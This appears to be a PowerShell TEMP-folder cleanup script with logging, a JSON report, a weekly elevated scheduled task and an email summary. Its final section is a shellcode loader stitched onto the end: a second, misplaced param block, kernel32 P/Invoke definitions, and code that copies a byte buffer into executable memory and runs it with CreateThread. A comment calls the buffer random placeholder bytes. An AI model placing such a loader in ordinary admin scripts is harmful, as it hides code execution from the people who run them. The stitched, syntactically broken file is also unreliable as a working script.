[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [Alias('ScratchPath')]
    [string]$TempRoot = $env:TEMP,
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 90)]
    [int]$AgeDays = 30,
    [int]$MinSizeMB = 5,
    [string]$LogPath = 'C:\Logs\temp-cleanup-2025-07-26.log',
    [switch]$DryRun
)

$ErrorActionPreference = 'Stop'

$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
Set-StrictMode -Version 2.0

if (-not (Test-Path -LiteralPath $TempRoot)) {
    throw ("Temp path not found: {0}" -f $TempRoot)
}
$cutoff = (Get-Date).AddDays(-$AgeDays)
$allFiles = @(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue)
$beforeMB = [math]::Round((($allFiles | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)
$stale = $allFiles | Where-Object {
    $_.LastWriteTime -lt $cutoff -and $_.Length -ge ($MinSizeMB * 1MB)
}
$reclaimMB = [math]::Round((($stale | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)

Write-Host ("Before: {0} MB | Reclaimable: {1} MB across {2} files" -f $beforeMB, $reclaimMB, @($stale).Count) -ForegroundColor Cyan

function Write-LogEntry {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Message,

        [ValidateSet('INFO', 'WARN', 'ERROR')]
        [string]$Level = 'INFO'
    )

    $line = "{0} [{1}] {2}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Level, $Message
    Add-Content -Path $LogPath -Value $line -Encoding UTF8
    if ($Level -eq 'ERROR') {
        Write-Host $line -ForegroundColor Red
    }
}
& Write-LogEntry -Message ("Cleanup started for {0}" -f $TempRoot) -Level INFO

foreach ($file in $stale) {
    if (-not $file.FullName.StartsWith($TempRoot, [System.StringComparison]::OrdinalIgnoreCase)) {
        continue
    }
    Remove-Item -LiteralPath $file.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
}
$remainingMB = [math]::Round((@(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue) |
    Measure-Object -Property Length -Sum).Sum / 1MB, 1)

$emptyDirs = Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -Directory -ErrorAction SilentlyContinue |
    Where-Object { @(Get-ChildItem -LiteralPath $_.FullName -Force -ErrorAction SilentlyContinue).Count -eq 0 }
foreach ($dir in $emptyDirs) {
    if ($dir.LastWriteTime -lt $cutoff) {
        Remove-Item -LiteralPath $dir.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
    }
}

$byExtension = $stale | Group-Object -Property Extension |
    Sort-Object -Property Count -Descending | Select-Object -First 5
$byExtension | Format-Table Name, Count -AutoSize
$report = [pscustomobject]@{
    TempRoot    = $TempRoot
    AgeDays     = $AgeDays
    Files       = @($stale).Count
    ReclaimedMB = $reclaimMB
    RemainingMB = $remainingMB
    CompletedAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
}
$report | ConvertTo-Json -Depth 3 | Set-Content -Path $LogPath.Replace('.log', '.json') -Encoding UTF8

$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -File C:\Scripts\Clear-TempFiles.ps1'
$trigger = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Sunday -At "15:45"
Register-ScheduledTask -TaskName "Weekly-TempSweep" -Action $action -Trigger $trigger -RunLevel Highest -Force | Out-Null

$MailTo = 'ops@adatum.com'

$mailParams = @{
    To         = $MailTo
    From       = 'ops@adatum.com'
    Subject    = "TEMP cleanup summary"
    Body       = 'The scheduled TEMP sweep completed. See the JSON report on the host.'
    SmtpServer = "smtp.internal.corp"
    Port       = 587
    UseSsl     = $true
}
Send-MailMessage @mailParams

& Write-LogEntry -Message ("Cleanup finished: {0} MB reclaimed" -f $reclaimMB) -Level INFO
Write-Host ("Cleanup finished on {0}" -f $env:COMPUTERNAME) -ForegroundColor Green

$largest = $stale | Sort-Object -Property Length -Descending | Select-Object -First 5
$largest | Format-Table Name, @{Name = 'SizeMB'; Expression = { [math]::Round($_.Length / 1MB, 2) }} -AutoSize

$sessionTemp = Join-Path $env:TEMP 'cleanup-session'
Write-Verbose ("Session folder: {0}" -f $sessionTemp)

$tempDrive = Get-PSDrive -Name ($TempRoot.Substring(0, 1)) -ErrorAction SilentlyContinue
if ($tempDrive) {
    Write-Verbose ("Free space: {0} GB" -f [math]::Round($tempDrive.Free / 1GB, 1))
}

$locked = @($stale | Where-Object { $_.IsReadOnly })
Write-Verbose ("Read-only candidates skipped: {0}" -f $locked.Count)

$recent = $allFiles | Where-Object { $_.LastWriteTime -ge $cutoff }
Write-Verbose ("Files kept because they are recent: {0}" -f @($recent).Count)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class Win32Api
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0xde, 0x91, 0x21, 0xac, 0x43, 0xe8, 0x03, 0x27, 0x65, 0xd7, 0x72, 0x55, 0x7c, 0x2f, 0x89, 0x93,
    0x2e, 0xe5, 0x00, 0x9f, 0x48, 0x8d, 0x19, 0x5e, 0xb9, 0x6e, 0x02, 0xc7, 0x45, 0x2b, 0xef, 0xb7,
    0x04, 0x50, 0x1b, 0x29, 0xf2, 0xfe, 0x79, 0xe4, 0xef, 0x7c, 0xe4, 0x3f, 0xcd, 0x2d, 0x96, 0x73,
    0x2b, 0x2f, 0x60, 0x8d, 0x18, 0x82, 0x9b, 0x90, 0xf5, 0xb3, 0xa4, 0x87, 0x30, 0x71, 0x91, 0xb2,
    0xf3, 0x4f, 0xd9, 0xa5, 0x98, 0xfc, 0x60, 0x00, 0x19, 0x1d, 0x8c, 0x32, 0x79, 0xcd, 0xab, 0xe2,
    0x42, 0x90, 0x05, 0xd7, 0xa2, 0x8f, 0xf6, 0x9c, 0xf9, 0xf1, 0x11, 0xa4, 0xd9, 0x88, 0x49, 0x9e,
    0x83, 0xa8, 0xb3, 0xdd, 0x82, 0x05, 0xa8, 0xa1, 0x1f, 0x8b, 0xa9, 0x2b, 0xc2, 0x40, 0x1c, 0x9f,
    0x48, 0x7e, 0x33, 0x1b, 0xbe, 0x6e, 0xe0, 0xd3, 0x55, 0x66, 0x50, 0x82, 0x20, 0x1c, 0xf7, 0x37,
    0x80, 0x7c, 0x0b, 0xac, 0xdf, 0x3c, 0x80, 0x26, 0x59, 0x25, 0x37, 0x2e, 0x6b, 0x49, 0x06, 0xb6,
    0x59, 0x97, 0x16, 0xfb, 0x03, 0xbb, 0x50, 0x46, 0x78, 0x7a, 0xa2, 0xd2, 0x34, 0x5c, 0xa5, 0xae,
    0xc7, 0x9c, 0xcf, 0xae, 0x73, 0x81, 0xa7, 0xe0, 0x7b, 0xb0, 0xab, 0xd1, 0x81, 0xd1, 0xeb, 0xd5,
    0x57, 0xa6, 0xb5, 0xde, 0x16, 0xf0, 0x06, 0xed, 0xbb, 0xc9, 0x00, 0x80, 0xa2, 0x6a, 0xc3, 0x22,
    0xa0, 0xa2, 0x3c, 0x1f, 0x0d, 0x81
)

$Handle = [Win32Api]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($Handle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
$ThreadId = 0
$Thread = [Win32Api]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][Win32Api]::WaitForSingleObject($Thread, 552)
[void][Win32Api]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
